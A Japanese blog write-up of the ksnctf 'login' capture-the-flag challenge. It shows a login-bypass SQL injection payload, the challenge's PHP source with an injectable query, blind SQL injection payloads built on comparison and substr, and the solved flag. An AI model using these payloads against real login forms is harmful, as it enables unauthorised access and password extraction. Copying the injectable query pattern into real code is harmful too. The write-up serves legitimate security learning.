+++
draft = false
date = "2016-12-27T10:45:13+09:00"
title = "ksnctf_login"
tags = ["IT","CTF"]
thumbnail = "images/geek/ctf.jpg"

+++

# 問題

>http://ctfq.sweetduet.info:10080/~q6/

# 解法

開くとLoginページ。adminで入れとのこと。
まあSQLインジェクションだろう。

+ ID: `admin`
+ Pass: `' OR 1=1 --`

であっさり入れた。

```php
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:
<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```

でもまだ終わりではない。flagはadminのパスワードらしい。
ブラインドSQLインジェクションというらしい。

出力できそうにないので総当りをしてみる。

最初はLikeで一文字ずつ試していたけど、Likeはcase insensitiveらしく小文字と大文字が区別できない。
あとで小文字か大文字かを判定してもいいけど、比較演算子で代用することにした。
つまり、`pass like 'FLAG_a%'`は`pass >= 'FLAG_a' AND pass < 'FLAG_b'`となる。

あとは一文字ずつ繰り返す。

# script

<script src="https://gist.github.com/vintersnow/c16bb90a77624d7f48adb3320b703ec3.js"></script>


# 別解

あとで調べたら、substrで解いたほうが楽そう。

```
WHERE id='' OR (SELECT length(pass) FROM user WHERE id='admin') <= length
```

で長さを調べて、

```
WHERE id='' OR substr((SELECT pass FROM users), n, 1)='a'
```

で一文字見ていく。

# flag

```
FLAG_KpWa4ji3uZk6TrPK
```

# point

**341**

# 参考

+ http://www.yoheim.net/blog.php?q=20160204
+ http://stackoverflow.com/questions/15480319/case-sensitive-and-insensitive-like-in-sqlite
+ http://www9.plala.or.jp/sgwr-t/c_sub/ascii.html 
+ http://stackoverflow.com/questions/16060899/alphabet-range-python
+ http://sekai013.hatenablog.com/entry/2015/03/26/224413
